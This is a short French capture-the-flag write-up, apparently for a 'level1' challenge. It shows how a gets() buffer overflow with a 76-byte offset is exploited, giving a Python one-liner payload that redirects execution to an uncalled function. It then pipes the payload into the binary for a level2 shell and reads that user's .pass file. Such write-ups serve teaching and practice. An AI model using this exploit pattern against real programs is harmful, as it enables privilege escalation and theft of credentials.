Comment trouver le flag1

On a encore un programme quand on le disassemble on voit que y'a une fonction gets et que le programme s'arrete

info function

On voit que le main a une function gets appelée on peut ecrire dans ce buffer (potentiel overflow)

on voit que la function RUN n'est pas execute dans le main

donc on va essayer d'overflow le gets grace a un buffer overflow generator https://wiremask.eu/tools/buffer-overflow-pattern-generator/
l'overflow a lieu a partir de 76

on va donc faire une commande python

python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" > /tmp/overflow

on va ouvrir un STDIN avec un cat et faire executer notre overflow 

cat /tmp/overflow - | ./level1

L'overflow a marcher puisque grace a whoami on voit qu'on est le level2

cat /home/user/level2/.pass on a notre flag